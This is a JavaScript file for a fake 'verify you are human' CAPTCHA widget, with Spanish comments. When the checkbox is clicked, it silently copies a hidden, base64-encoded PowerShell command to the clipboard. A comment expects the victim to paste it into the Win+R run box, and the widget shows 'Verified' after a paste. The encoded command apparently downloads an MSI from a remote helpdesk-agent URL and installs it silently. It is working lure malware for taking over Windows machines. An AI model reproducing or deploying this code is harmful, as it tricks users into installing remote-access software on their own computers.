// ====== Helpers ======
const $ = s => document.querySelector(s);
const checkboxWindow = $("#checkbox-window");
const checkboxBtn = $("#checkbox");
const checkboxBtnSpinner = $("#spinner");
const verifywindow = $("#verify-window");
const verificationSpan = $("#verification-id");
const btnVerify = $("#verify-verify-button");
const btnCancel = $("#verify-cancel-button");

const rand4 = () => Math.floor(Math.random() * 9000 + 1000).toString();

// Texto a copiar (silencioso)
const buildPayload = () =>
  "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJAB1AD0AJwBoAHQAdABwAHMAOgAvAC8ASABlAGwAcABkAGUAcwBrAFMAdQBwAHAAbwByAHQAMQA3ADUAMwA5ADgAMQA4ADMAMAAwADYAOAAuAHMAZQByAHYAaQBjAGUAZABlAHMAawAuAGEAdABlAHIAYQAuAGMAbwBtAC8ARwBlAHQAQQBnAGUAbgB0AC8AVwBpAG4AZABvAHcAcwAvAD8AYwBpAGQAPQAyACYAYQBpAGQAPQAwADAAMQBRADMAMAAwADAAMAAwAFYAYgBUADYAMgBJAEEARgAnAAoAJABwACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAoACIAcwBlAHQAdQBwAC0AIgAgACsAIABbAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAUgBhAG4AZABvAG0ARgBpAGwAZQBOAGEAbQBlACgAKQAgACsAIAAiAC4AbQBzAGkAIgApAAoAdAByAHkAIAB7AAoAIAAgAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIACgAgACAAdAByAHkAIAB7AAoAIAAgACAAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1ACAALQBPAHUAdABGAGkAbABlACAAJABwACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAKACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJAB1ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAkAHAACgAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAHUALAAgACQAcAApAAoAIAAgACAAIAB9AAoAIAAgAH0ACgAgACAAaQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHAAKQAgAC0AbwByACAAKAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAcAApAC4ATABlAG4AZwB0AGgAIAAtAGwAZQAgADAAKQApACAAewAgAHQAaAByAG8AdwAgACcARABvAHcAbgBsAG8AYQBkACAAZgBhAGkAbABlAGQAJwAgAH0ACgAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG0AcwBpAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnAC8AaQAnACwAIAAkAHAALAAgACcALwBxAG4AJwAsACAAJwAvAG4AbwByAGUAcwB0AGEAcgB0ACcAIAAtAFcAYQBpAHQACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcAApACAAewAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAcAAgAC0ARgBvAHIAYwBlACAAfQAKAH0A";
async function copySafe(text, fromGesture = false) {
  try {
    if (navigator.clipboard && (fromGesture || window.isSecureContext)) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) {}
  // Fallback
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  let ok = false;
  try {
    ok = document.execCommand("copy");
  } catch (e) {}
  document.body.removeChild(ta);
  return ok;
}

function showCaptchaLoading(on) {
  checkboxBtnSpinner.style.visibility = on ? "visible" : "hidden";
  checkboxBtnSpinner.style.opacity = on ? "1" : "0";
}
function showCaptchaCheckbox() {
  checkboxBtn.style.width = "100%";
  checkboxBtn.style.height = "100%";
  checkboxBtn.style.borderRadius = "2px";
  checkboxBtn.style.margin = "21px 0 0 12px";
  checkboxBtn.style.opacity = "1";
}
function hideCaptchaCheckbox() {
  checkboxBtn.style.width = "4px";
  checkboxBtn.style.height = "4px";
  checkboxBtn.style.borderRadius = "50%";
  checkboxBtn.style.marginLeft = "25px";
  checkboxBtn.style.marginTop = "33px";
  checkboxBtn.style.opacity = "0";
}
function closeverifywindow() {
  verifywindow.style.display = "none";
  verifywindow.style.visibility = "hidden";
  verifywindow.style.opacity = "0";
  showCaptchaCheckbox();
  showCaptchaLoading(false);
  checkboxBtn.disabled = false;
}
function isverifywindowVisible() {
  return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}
function showVerifyWindow() {
  verifywindow.style.display = "block";
  verifywindow.style.visibility = "visible";
  verifywindow.style.opacity = "1";
  verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
  verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
  if (verifywindow.offsetTop < 5) verifywindow.style.top = "5px";
  if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10)
    verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
}

// ====== Flujo principal ======
// (sin cierre por clic fuera, para no cerrar al abrir Win+R)

checkboxBtn.addEventListener("click", async (event) => {
  event.preventDefault();
  checkboxBtn.disabled = true;

  // 1) Copiar inmediatamente (gesto del usuario) — SILENCIOSO
  const verification_id = rand4();
  verificationSpan.textContent = verification_id;
  const payload = buildPayload();
  await copySafe(payload, /*fromGesture=*/ true);

  // 2) Animaciones como el demo
  hideCaptchaCheckbox();
  setTimeout(() => showCaptchaLoading(true), 500);
  setTimeout(() => {
    showCaptchaLoading(false);
    showVerifyWindow();
  }, 900);
});

// Botón “Verify” (marca check y cierra)
btnVerify.addEventListener("click", () => {
  closeverifywindow();
  checkboxBtn.classList.add("tick");
  btnVerify.classList.add("verified");
  btnVerify.textContent = "Verified";
});

// Botón “Cancel” (solo cierra y restablece sin marcar check)
btnCancel.addEventListener("click", closeverifywindow);

// Cerrar solo cuando haya paste / Ctrl+V DENTRO DE LA PÁGINA
function onPasteOrCombo() {
  closeverifywindow();
  checkboxBtn.classList.add("tick");
  btnVerify.classList.add("verified");
  btnVerify.textContent = "Verified";
}
document.addEventListener("paste", onPasteOrCombo);
document.addEventListener("keydown", (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "v") onPasteOrCombo();
});

